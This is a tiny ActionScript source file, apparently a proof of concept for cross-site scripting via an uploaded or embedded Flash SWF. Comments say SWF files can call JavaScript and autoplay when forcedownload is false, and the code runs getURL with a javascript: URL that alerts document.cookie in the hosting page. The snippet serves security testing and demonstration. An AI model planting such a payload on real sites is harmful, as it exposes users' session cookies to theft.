//. swf files can call javascript functions/load urls
//. forcedownload=false means that they want the plugin to autoplay instead of download.
class Main {
   static function main() {
     getURL('javascript:alert(document.cookie)');
   }
}
